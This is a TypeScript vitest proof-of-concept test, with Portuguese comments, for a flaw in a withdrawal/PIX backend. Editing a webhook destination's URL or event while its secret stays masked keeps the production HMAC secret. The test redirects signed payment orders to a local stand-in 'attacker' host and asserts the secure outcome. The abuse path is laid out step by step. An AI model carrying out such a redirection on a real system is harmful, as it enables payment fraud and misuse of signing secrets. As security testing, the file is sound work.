// PoC (verificação independente): trocar URL/evento de um destino de webhook com o segredo mascarado mantém o
// segredo de produção. Os asserts descrevem o comportamento SEGURO: este arquivo FALHA enquanto o problema existir.
import { createHmac } from 'node:crypto'
import { createServer, type IncomingHttpHeaders, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import type { FastifyInstance } from 'fastify'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { newId } from '../src/lib/crypto'
import { processOutboxOnce } from '../src/modules/webhooks/dispatcher'
import { api, createTestApp, loginAs } from './helpers'

interface Received {
  path: string
  headers: IncomingHttpHeaders
  body: string
}
const legit: Received[] = []
const attacker: Received[] = []
const legitPlan: number[] = []
let legitServer: Server
let attackerServer: Server
let LEGIT = ''
let ATTACKER = ''

function receiver(sink: Received[], plan?: number[]) {
  return createServer((req, res) => {
    let body = ''
    req.setEncoding('utf8')
    req.on('data', (c) => (body += c))
    req.on('end', () => {
      sink.push({ path: req.url ?? '', headers: req.headers, body })
      res.writeHead(plan?.shift() ?? 200, { 'content-type': 'application/json' })
      res.end('{}')
    })
  })
}
const listen = (s: Server) =>
  new Promise<string>((resolve) => s.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${(s.address() as AddressInfo).port}`)))
const verifies = (r: Received, secret: string) =>
  r.headers['x-x2w-signature'] === `sha256=${createHmac('sha256', secret).update(`${r.headers['x-x2w-timestamp']}.${r.body}`).digest('hex')}`

beforeAll(async () => {
  legitServer = receiver(legit, legitPlan)
  attackerServer = receiver(attacker)
  LEGIT = await listen(legitServer)
  ATTACKER = await listen(attackerServer)
})
afterAll(async () => {
  for (const s of [legitServer, attackerServer]) {
    s.closeAllConnections()
    await new Promise<void>((r) => s.close(() => r()))
  }
})
beforeEach(() => {
  legit.length = 0
  attacker.length = 0
  legitPlan.length = 0
})

async function insertWithdrawal(app: FastifyInstance, playerId: string, amount: number) {
  const id = newId('SQ')
  await app.db.query(
    `insert into withdrawals (id, player_id, player_name, player_email, amount_cents, fee_cents, status, risk_level, risk_score,
                              risk_reasons, pix_key_type, pix_key_enc, reference, created_at, updated_at)
     values ($1, $2, 'Jogador', 'j@x.com', $3, 0, 'pendente', 'baixo', 5, '[]'::jsonb, 'CPF', $4, 'E1', now(), now())`,
    [id, playerId, Math.round(amount * 100), app.cipher.encrypt('12345678909')],
  )
  return id
}

async function insertDestination(app: FastifyInstance, event: string, url: string, secret: string) {
  const id = newId('wh')
  await app.db.query(`insert into webhook_destinations (id, event, url, active, secret_enc) values ($1, $2, $3, true, $4)`, [
    id,
    event,
    url,
    app.cipher.encrypt(secret),
  ])
  return id
}

const KEY = 'campanhas.webhooks.destinos'

describe('webhooks.editar: troca de URL/evento com segredo mascarado', () => {
  let app: FastifyInstance
  const S_PAGO = 'segredo-producao-pix-0001'
  const S_REJ = 'segredo-producao-rej-0002'
  let pagoId = ''
  let rejId = ''
  beforeAll(async () => {
    app = await createTestApp()
    pagoId = await insertDestination(app, 'saque.pago', `${LEGIT}/pix/pagar`, S_PAGO)
    rejId = await insertDestination(app, 'saque.rejeitado', `${LEGIT}/pix/estornar`, S_REJ)
  })
  afterAll(async () => app.close())

  it('trocar só a URL (segredo mascarado) não deve levar ordens assinadas com o segredo de produção ao host novo, e a auditoria deve registrar o host novo', async () => {
    const adm = await loginAs(app, 'administrador')
    // 1) saque aprovado com o processador fora do ar: item fica na fila para nova tentativa
    const w1 = await insertWithdrawal(app, 'p1', 1000)
    expect((await api(app, 'POST', `/api/withdrawals/${w1}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    legitPlan.push(503)
    await processOutboxOnce(app)
    expect(legit).toHaveLength(1)

    // 2) GET + PUT com a mesma lista, só a URL do destino saque.pago trocada; segredo segue mascarado
    const cur = (await api(app, 'GET', `/api/kv/${KEY}`, { cookie: adm.cookie })).json() as { value: any[]; version: number }
    const sent = cur.value.find((d) => d.id === pagoId)
    console.log('[poc] segredo devolvido ao painel:', sent.secret)
    const list = cur.value.map((d) => (d.id === pagoId ? { ...d, url: `${ATTACKER}/coleta` } : d))
    const put = await api(app, 'PUT', `/api/kv/${KEY}`, { cookie: adm.cookie, body: { value: list, version: cur.version } })
    console.log('[poc] PUT troca de URL →', put.statusCode)

    // 3) nova tentativa vencida + nova aprovação
    await app.db.query(`update webhook_outbox set next_attempt_at = now() - interval '1 second' where status = 'pendente'`)
    const w2 = await insertWithdrawal(app, 'p2', 2000)
    expect((await api(app, 'POST', `/api/withdrawals/${w2}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    await processOutboxOnce(app)

    const outbox = await app.db.query<{ status: string }>('select status from webhook_outbox order by id')
    const audit = await app.db.one<{ summary: string }>(
      `select summary from audit_log where summary like 'Destinos de webhook%' order by id desc limit 1`,
    )
    console.log(
      '[poc] host do atacante recebeu:',
      attacker.map((a) => `${a.headers['x-x2w-event']} ${JSON.parse(a.body).data.id} assinado_com_S_PAGO=${verifies(a, S_PAGO)}`),
    )
    console.log('[poc] processador legítimo recebeu', legit.length, 'entrega(s) | outbox:', outbox.map((o) => o.status).join(','))
    console.log('[poc] auditoria:', audit?.summary)

    // comportamento seguro: ou o servidor recusa trocar a URL sem segredo novo, ou o host novo nunca recebe
    // assinatura válida com o segredo de produção
    const signedToAttacker = attacker.filter((a) => verifies(a, S_PAGO))
    expect(put.statusCode === 200 ? signedToAttacker.length : 0).toBe(0)
    // e a auditoria de quem redirecionou ordens de pagamento diz para onde
    if (put.statusCode === 200) expect(audit?.summary).toContain(new URL(ATTACKER).host)
  })

  it('POST /destinations/:id/test não deve entregar envelope saque.pago assinado com o segredo de produção a um host trocado sem segredo novo', async () => {
    const adm = await loginAs(app, 'administrador')
    const r = await api(app, 'POST', `/api/webhooks/destinations/${pagoId}/test`, { cookie: adm.cookie })
    const last = attacker[attacker.length - 1]
    console.log('[poc] teste →', r.statusCode, '| recebido:', last?.headers['x-x2w-event'], last?.body, 'assinado_com_S_PAGO=', last && verifies(last, S_PAGO))
    expect(last && verifies(last, S_PAGO)).toBeFalsy()
  })

  it('trocar o evento do destino saque.rejeitado (estorno) para saque.pago com segredo mascarado não deve fazer o endpoint de estorno receber saque.pago assinado com o segredo dele', async () => {
    const adm = await loginAs(app, 'administrador')
    const cur = (await api(app, 'GET', `/api/kv/${KEY}`, { cookie: adm.cookie })).json() as { value: any[]; version: number }
    const list = cur.value.map((d) => (d.id === rejId ? { ...d, event: 'saque.pago' } : d))
    const put = await api(app, 'PUT', `/api/kv/${KEY}`, { cookie: adm.cookie, body: { value: list, version: cur.version } })
    console.log('[poc] PUT troca de evento →', put.statusCode)
    const w = await insertWithdrawal(app, 'p3', 3000)
    expect((await api(app, 'POST', `/api/withdrawals/${w}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    await processOutboxOnce(app)
    const toRefund = legit.filter((l) => l.path === '/pix/estornar')
    console.log(
      '[poc] endpoint de estorno recebeu:',
      toRefund.map((l) => `${l.headers['x-x2w-event']} ${JSON.parse(l.body).data.id} assinado_com_S_REJ=${verifies(l, S_REJ)}`),
    )
    const signed = toRefund.filter((l) => verifies(l, S_REJ) && JSON.parse(l.body).event === 'saque.pago')
    expect(put.statusCode === 200 ? signed.length : 0).toBe(0)
  })
})
